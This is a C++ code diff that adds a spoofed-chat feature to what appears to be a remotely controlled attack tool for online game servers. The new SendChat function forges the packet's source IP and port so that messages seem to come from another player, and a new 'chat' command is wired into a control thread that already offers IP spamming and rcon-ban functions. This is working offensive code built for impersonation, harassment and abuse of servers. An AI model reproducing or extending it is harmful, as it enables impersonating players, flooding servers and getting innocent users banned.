@@ -383,6 +383,28 @@ void RconBan(const char *SrvIP, int Port, const char *BanIP)
 	m_SendRcon = true;
 }
 
+void SendChat(const char *SrvIP, int Port, const char *SpoofIP, int SpoofPort, char *Msg)
+{
+	// ToDo: More than one word as Msg ._.
+
+	if (!Create(&m_Sock[0]))
+		Close(0);
+
+	m_FromIP[0] = inet_addr(SpoofIP);
+	m_FromPort = htons(SpoofPort);
+
+	m_ToIP = inet_addr(SrvIP);
+	m_ToPort = htons(Port);
+
+	unsigned char buffer[2048];
+	int BufferSize = 0;
+	Reset(0);
+
+	ZeroMemory(buffer, sizeof(buffer));
+	BufferSize = PackSay(&buffer[0], 0, Msg, 0);
+	SendData((const char*)buffer, BufferSize, 0);
+}
+
 void SpamIPs(const char *IP, int Port)
 {
 	std::ifstream File("ips.txt");
@@ -563,6 +585,19 @@ DWORD WINAPI WorkingThread(LPVOID lpParam)
 				}
 				else
 					send(g_Client, "[Server]: Please use: ipspam <srvip> <srvport>", strlen("[Server]: Please use: ipspam <srvip> <srvport>"), 0);
+			}
+			else if(strcmp(aCmd[0], "chat") == 0)
+			{
+				if(aCmd[1][0] && aCmd[2][0] && aCmd[3][0] && aCmd[4][0] && aCmd[5][0])
+				{
+					int SrvPort = atoi(aCmd[2]);
+					int Port = atoi(aCmd[4]);
+					SendChat(aCmd[1], SrvPort, aCmd[3], Port, aCmd[5]);
+
+					send(g_Client, "[Server]: Spoofed chat message sent successfully!", strlen("[Server]: Spoofed chat message sent successfully!"), 0);
+				}
+				else
+					send(g_Client, "[Server]: Please use: chat <srvip> <srvport> <spoofip> <spoofport> <message>", strlen("[Server]: Please use: chat <srvip> <srvport> <spoofip> <spoofport> <message>"), 0);
 			}
 			else
 				send(g_Client, "[Server]: Unknown command.", strlen("[Server]: Unknown command."), 0);
